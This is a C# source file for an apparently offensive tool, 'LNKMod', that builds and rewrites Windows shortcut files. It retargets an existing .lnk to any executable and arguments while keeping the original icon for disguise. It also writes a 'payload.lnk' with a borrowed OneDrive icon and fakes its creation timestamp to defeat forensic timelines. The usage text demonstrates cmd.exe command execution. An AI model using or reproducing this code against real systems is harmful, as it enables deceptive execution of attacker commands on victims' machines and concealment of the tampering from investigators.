using System;
using System.IO;
using ShellLink;
using Newtonsoft.Json;

namespace LNKMod
{
    class Program
    {
        public static void ModifyLNK(string path, string args)
        {
            string[] files = System.IO.Directory.GetFiles(System.AppDomain.CurrentDomain.BaseDirectory, "*.lnk");
            string lnkPath = @files[0];

            Console.WriteLine("[+] Opening `{0}` for modification.", lnkPath);
            Shortcut Lnk = Shortcut.ReadFromFile(lnkPath);

            string originalPath = Lnk.LinkTargetIDList.Path;
            Console.WriteLine("[+] Setting the 'IconLocation' to the original 'Path': {0}", originalPath);
            Lnk.LinkFlags &= ~ShellLink.Flags.LinkFlags.HasIconLocation;
            Lnk.StringData.IconLocation = originalPath;

            Console.WriteLine("[+] Modifying path and command arguments to `{0}` `{1}`", path, args);
            Lnk.LinkTargetIDList.Path = path;
            Lnk.LinkInfo.LocalBasePath = path;
            Lnk.StringData.CommandLineArguments = args;
            Lnk.StringData.RelativePath = "";

            Console.WriteLine("[+] Writing changes to `{0}`.", lnkPath);
            Lnk.WriteToFile(lnkPath);
            Console.WriteLine(Lnk);
        }

        public static void CreateLNK(string lnkPath, string path, string args, string iconpath, int iconindex)
        {
            // Parse the working directory from the path
            string workdir = Path.GetDirectoryName(path);

            Console.WriteLine("[+] Creating .LNK with arguments `{0} {1}'.", path, args);
            Console.WriteLine("[+] With working directory of `{0}`.", workdir);
            Console.WriteLine("[+] Will reference icon at `{0}`.", iconpath);
            Shortcut.CreateShortcut(path, args, workdir, iconpath, iconindex).WriteToFile(lnkPath);
            Console.WriteLine("[+] Payload written to '{0}'.", lnkPath);

            // Modifying access, write, creation times
            Console.WriteLine("[+] Modifying lnkPath '{0}' with modified access/write/creation times", lnkPath);
            Shortcut Lnk = Shortcut.ReadFromFile(lnkPath);
            Lnk.AccessTime = DateTime.Now.ToFileTime();
            Lnk.WriteTime = DateTime.Now.ToFileTime();
            var myDate = DateTime.Now;
            var fakeYear = myDate.AddYears(-2);
            Random r = new Random();
            int rInt = r.Next(0, 356);
            var fakeDay = fakeYear.AddDays(rInt);
            var fakeHour = fakeDay.AddHours(-5);
            var fakeMinute = fakeHour.AddMinutes(-20);
            var fakeSecond = fakeMinute.AddSeconds(-25);
            Lnk.CreationTime = fakeSecond.ToFileTime();
            Lnk.WriteToFile(lnkPath);
        }

        public static void Main(string[] args)
        {
            if (args == null || args.Length == 0 || args[0] == "-help" || args[0] == "-h")
            {
                Console.WriteLine(@"LNKMod Example Usage:

- Modify (will modify .LNK in current directory, only place one!)
    - Modify path to executable, no arguments
        -  .\LNKMod.exe -modify -path C:\Windows\system32\calc.exe
    - Modify path to executable and arguments
        - .\LNKMod.exe -modify -path C:\Windows\system32\cmd.exe -args /c notepad.exe
- Create (will create payload.lnk in current directory, do not have any other .LNK in current directory!)
    - Create Test.lnk with path to executable, no arguments, and path to icon
        - .\LNKMod.exe -create -outputpath Test.lnk -path C:\Windows\system32\calc.exe -icopath C:\Users\John\AppData\Local\Microsoft\OneDrive\OneDrive.exe
    - Create .LNK with path to executable, arguments, and path to icon 
        - .\LNKMod.exe -create -path C:\Windows\system32\cmd.exe -args /c calc.exe -icopath C:\Users\John\AppData\Local\Microsoft\OneDrive\OneDrive.exe
    - Sets access/write time to current time and creation time to a (reasonable) random time
- Dump metadata for a specified .LNK
    - .\LNKMod.exe -dump C:\Users\John\source\repos\LNKMod\LNKMod\bin\Release\payload.lnk
- Dump metadata for a specified .LNK in JSON format
    - .\LNKMod.exe -dumpjson C:\Users\John\source\repos\LNKMod\LNKMod\bin\Release\payload.lnk
- Display this menu
    - .\LNKMod.exe -help
    - .\LNKMod.exe -h");
                return;
            }
            // Expected usage for modification: LNKMod.exe -modify -path "C:\Windows\system32\cmd.exe" -args "/c notepad.exe"
            if (args[0] == "-modify")
            {
                string path = @args[2];
                string cmdlineargs;
                // need to account for edge case where people don't want args
                if (args.Length < 4)
                {
                    cmdlineargs = "";
                }
                else
                {
                    cmdlineargs = @args[4];
                }
                ModifyLNK(path, cmdlineargs);
            }
            //  Expected usage for creation: LNKMod.exe -create -path "C:\Windows\system32\cmd.exe" -args "/c notepad.exe"
            //  -icopath "C:\Users\John\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
            else if (args[0] == "-create")
            {
                string arg;
                string outputpath = String.Format("{0}{1}", System.AppDomain.CurrentDomain.BaseDirectory, "payload.lnk");
                string path = "";
                string cmdlineargs = "";
                string iconpath = "";
                int iconindex = 0;

                // Parse arguments
                // Path is required; args, icon path, and name are optional
                try
                {
                    for (int i = 0; i < args.Length - 1; i++)
                    {
                        arg = args[i].ToUpper();
                        switch (arg.ToUpper())
                        {
                            case "-ARGS":
                            case "/ARGS":
                                i++;
                                try
                                {
                                    cmdlineargs = args[i];
                                }
                                catch (IndexOutOfRangeException)
                                {
                                    throw new ArgumentException("No args specified");
                                }
                                break;
                            case "-ICOPATH":
                            case "/ICOPATH":
                                i++;
                                try
                                {
                                    iconpath = args[i];
                                }
                                catch (IndexOutOfRangeException)
                                {
                                    throw new ArgumentException("No icon path specified");
                                }
                                break;
                            case "-OUTPUTPATH":
                            case "/OUTPUTPATH":
                                i++;
                                try
                                {
                                    outputpath = args[i];
                                }
                                catch (IndexOutOfRangeException)
                                {
                                    throw new ArgumentException("No output filepath specified");
                                }
                                break;
                            case "-PATH":
                            case "/PATH":
                                i++;
                                try
                                {
                                    path = args[i];
                                }
                                catch (IndexOutOfRangeException)
                                {
                                    throw new ArgumentException("No path specified");
                                }
                                break;
                        }
                    }

                    if (path.Length == 0)
                    {
                        throw new ArgumentException("No path specified");
                    }
                }
                catch (ArgumentException e)
                {
                    Console.Error.WriteLine("[-] ERROR: {0}", e.Message.Trim());
                    return;
                }

                CreateLNK(outputpath, path, cmdlineargs, iconpath, iconindex);
            }
            else if (args[0] == "-dump")
            {
                string path = @args[1];
                Console.WriteLine(Shortcut.ReadFromFile(path));
            }
            else if (args[0] == "-dumpjson")
            {
                string path = @args[1];
                Shortcut Lnk = Shortcut.ReadFromFile(path);
                string json = JsonConvert.SerializeObject(Lnk, Formatting.Indented,
                        new JsonSerializerSettings()
                        {
                            ReferenceLoopHandling = ReferenceLoopHandling.Ignore
                        });
                Console.WriteLine(json);
            }
        }
    }
}
